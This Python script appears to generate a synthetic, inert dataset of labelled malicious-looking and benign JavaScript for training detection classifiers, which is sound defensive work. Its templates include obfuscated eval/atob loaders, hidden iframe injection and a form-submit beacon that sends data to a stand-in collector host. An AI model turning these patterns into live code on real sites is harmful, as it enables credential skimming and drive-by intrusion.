"""Generate a fully synthetic, inert corpus of labelled JavaScript and HTML.

Design (the same idea as the sibling Cyber ML Lab's telemetry): the label is
drawn first, then the code is assembled from fragments that each appear with a
class-conditional probability. Because those probabilities OVERLAP, no single
token decides the class, so the problem has genuine difficulty: a stealthy
malicious sample can omit every obvious marker, and an ordinary benign sample
can legitimately use a suspicious-looking one. That overlap is what makes the
false positives, false negatives and threshold exercises meaningful.

Nothing here is live malware:
  * every network reference uses the reserved .example domain space,
  * every encoded blob decodes to a harmless no-op such as "void 0;",
  * each sample carries a visible synthetic-fixture banner,
  * no sample performs a real action if executed.

Run:  python scripts/generate_dataset.py
"""
from __future__ import annotations
import argparse
import base64
from pathlib import Path

import numpy as np
import pandas as pd

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / 'datasets'
SEED = 20261108
BANNER = '/* synthetic training fixture - inert - reserved .example domains only */\n'
NOOPS = ['void 0;', ';', 'var _ok=1;', '1;', 'true;']


def b64(rng):
    return base64.b64encode(rng.choice(NOOPS).encode()).decode()


def hx(rng, n=4):
    return ''.join(rng.choice(list('0123456789abcdef'), size=n))


def ident(rng):
    return rng.choice(list('abcdefghijklmnopqrstuvwxyz')) + hx(rng, 3)


# --- Fragment builders. Each returns one or more inert statements. ----------
# Strong malicious-leaning fragments.
def f_obf_eval(rng):
    a = ident(rng)
    return f'var {a}=["{b64(rng)}"];eval(atob({a}[0]));'


def f_fromchar(rng):
    o = ident(rng)
    return (f'var s=[118,111,105,100,32,48,59];var {o}="";'
            f'for(var i=0;i<s.length;i++){{{o}+=String.fromCharCode(s[i]);}}'
            f'new Function({o})();')


def f_hexblob(rng):
    v = ident(rng)
    return f'var {v}="\\x76\\x6f\\x69\\x64\\x20\\x30\\x3b";window["Func"+"tion"]({v})();'


def f_iframe(rng):
    sub = rng.choice(['cdn', 'static', 'img', 'load', 'track'])
    return (f'document.write("<iframe src=\\"https://{sub}.example/{hx(rng,6)}\\" '
            f'width=1 height=1 style=display:none></iframe>");')


def f_beacon(rng):
    return ('document.addEventListener("submit",function(e){var p="demo";'
            '(new Image).src="https://collector.example/c?d="+encodeURIComponent(p);});')


def f_hexarr_exec(rng):
    h = hx(rng, 4)
    return (f'var _0x{h}=["{b64(rng)}"];(function(a){{eval(atob(a[0]));}})(_0x{h});')


def f_unescape(rng):
    return 'eval(unescape("%76%6f%69%64%20%30%3b"));'


def f_settimeout_uni(rng):
    return 'setTimeout("\\u0076\\u006f\\u0069\\u0064\\u0020\\u0030\\u003b",50);'


# Dual-use fragments: legitimate code uses these too.
def f_eval_json(rng):
    return f'var cfg=eval("("+\'{{"n":{int(rng.integers(1,9))}}}\'+")");'


def f_new_function_tpl(rng):
    return 'var tpl=new Function("data","return data.name;");'


def f_docwrite_script(rng):
    return f'document.write("<script src=\\"https://api.example/{hx(rng,5)}.js\\"></script>");'


def f_atob_data(rng):
    blob = base64.b64encode(f'val-{hx(rng,5)}'.encode()).decode()
    return f'var raw=atob("{blob}");store(raw);'


def f_settimeout_fn(rng):
    return f'setTimeout(function(){{refresh();}},{int(rng.integers(50,900))});'


def f_minified_hexarray(rng):
    name = ident(rng)
    return (f'var _0x{hx(rng,4)}=["ready","init","load"];'
            f'!function(e){{e.{name}=function(){{return 1;}};}}(window);')


# Benign-leaning fragments.
def f_dom(rng):
    cls = rng.choice(['menu', 'card', 'nav', 'btn', 'tab'])
    return (f'document.addEventListener("DOMContentLoaded",function(){{'
            f'var el=document.querySelector(".{cls}");if(el)'
            '{el.addEventListener("click",function(){el.classList.toggle("open");});}});')


def f_fetch(rng):
    res = rng.choice(['users', 'items', 'config', 'status', 'cart'])
    return (f'fetch("/api/{res}").then(function(r){{return r.json();}})'
            '.then(function(data){render(data);});')


def f_config(rng):
    v = ident(rng)
    return f'var {v}={{retries:3,base:"/app",flags:{{dark:true}}}};'


def f_analytics(rng):
    return ('(function(){var s=document.createElement("script");s.async=1;'
            f's.src="https://analytics.example/{hx(rng,6)}.js";'
            'document.head.appendChild(s);})();')


def f_base64_img(rng):
    blob = base64.b64encode(f'img-{hx(rng,6)}'.encode()).decode()
    return f'var img=new Image();img.src="data:image/png;base64,{blob}";document.body.appendChild(img);'


def f_form_submit(rng):
    return ('document.querySelector("#form").addEventListener("submit",function(e){'
            'e.preventDefault();fetch("/submit",{method:"POST",body:new FormData(e.target)});});')


def f_minified_lib(rng):
    name = ident(rng)
    return ('!function(e,t){"object"==typeof module?module.exports=t():'
            f'e.{name}=t()}}(this,function(){{return {{v:"1.{int(rng.integers(0,9))}"}};}});')


# name, builder, p(include|malicious), p(include|benign), kind
INGREDIENTS = [
    ('obf_eval', f_obf_eval, 0.42, 0.04, 'mal'),
    ('fromchar', f_fromchar, 0.26, 0.03, 'mal'),
    ('hexblob', f_hexblob, 0.24, 0.02, 'mal'),
    ('iframe', f_iframe, 0.28, 0.03, 'mal'),
    ('beacon', f_beacon, 0.26, 0.03, 'mal'),
    ('hexarr_exec', f_hexarr_exec, 0.30, 0.04, 'mal'),
    ('unescape', f_unescape, 0.20, 0.02, 'mal'),
    ('settimeout_uni', f_settimeout_uni, 0.22, 0.03, 'mal'),
    ('eval_json', f_eval_json, 0.20, 0.17, 'dual'),
    ('new_function_tpl', f_new_function_tpl, 0.18, 0.16, 'dual'),
    ('docwrite_script', f_docwrite_script, 0.16, 0.15, 'dual'),
    ('atob_data', f_atob_data, 0.22, 0.18, 'dual'),
    ('settimeout_fn', f_settimeout_fn, 0.16, 0.22, 'dual'),
    ('minified_hexarray', f_minified_hexarray, 0.12, 0.26, 'ben'),
    ('dom', f_dom, 0.16, 0.52, 'ben'),
    ('fetch', f_fetch, 0.14, 0.48, 'ben'),
    ('config', f_config, 0.16, 0.50, 'ben'),
    ('analytics', f_analytics, 0.12, 0.34, 'ben'),
    ('base64_img', f_base64_img, 0.10, 0.30, 'ben'),
    ('form_submit', f_form_submit, 0.12, 0.34, 'ben'),
    ('minified_lib', f_minified_lib, 0.12, 0.38, 'ben'),
]


def assemble(rng, label, challenge):
    frags, kinds = [], []
    for name, builder, p_mal, p_ben, kind in INGREDIENTS:
        p = p_mal if label == 1 else p_ben
        if challenge and label == 0 and name == 'minified_hexarray':
            p = min(0.9, p + 0.35)  # distribution shift on the challenge cohort
        if rng.random() < p:
            frags.append((name, kind, builder(rng)))
    if not frags:  # guarantee at least one statement
        name, builder, *_ = INGREDIENTS[14]  # f_dom
        frags.append((name, 'ben', builder(rng)))
    rng.shuffle(frags)
    code = '\n'.join(f[2] for f in frags)
    if rng.random() < 0.4:
        code = f'var _t{hx(rng,2)}={int(rng.integers(0,99))};\n' + code
    st = 'html' if any('<iframe' in f[2] or '<script' in f[2] for f in frags) else 'js'
    # family label for inspection grouping
    if label == 1:
        mal = [f[0] for f in frags if f[1] == 'mal']
        family = 'M_' + mal[0] if mal else 'M_stealth_dualonly'
    else:
        if any(f[1] == 'mal' for f in frags):
            family = 'B_suspicious'
        elif any(f[1] == 'dual' for f in frags):
            family = 'B_dual'
        else:
            family = 'B_plain'
    return BANNER + code, st, family


def minor_edit(code, rng):
    if rng.random() < 0.5:
        return '// variant\n' + code
    return code + f'\n/* r{hx(rng,3)} */'


def build(rng, n, mal_rate, challenge):
    rows = []
    gid = 0
    i = 0
    while i < n:
        label = int(rng.random() < mal_rate)
        code, st, family = assemble(rng, label, challenge)
        gid += 1
        variants = int(rng.integers(2, 5)) if rng.random() < 0.18 else 1
        for v in range(variants):
            if i >= n:
                break
            i += 1
            this = code if v == 0 else minor_edit(code, rng)
            rows.append({'sample_id': f'CJS-{i:06d}', 'source_type': st,
                         'family': family, 'group_id': f'G{gid:06d}',
                         'code': this, 'label': label})
    return pd.DataFrame(rows)


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument('--output-dir', type=Path, default=OUT)
    args = ap.parse_args()
    args.output_dir.mkdir(parents=True, exist_ok=True)
    data = {
        'code_samples.csv': build(np.random.default_rng(SEED + 1), 3000, 0.34, False),
        'code_samples_challenge.csv': build(np.random.default_rng(SEED + 2), 1200, 0.34, True),
    }
    for name, frame in data.items():
        bal = frame['label'].value_counts().to_dict()
        print(f'{name:30s} {len(frame):5d} rows  malicious={bal.get(1,0)} benign={bal.get(0,0)}')
        frame.to_csv(args.output_dir / name, index=False)
    print(f'Seed base {SEED}. All domains reserved (.example); payloads inert.')


if __name__ == '__main__':
    main()
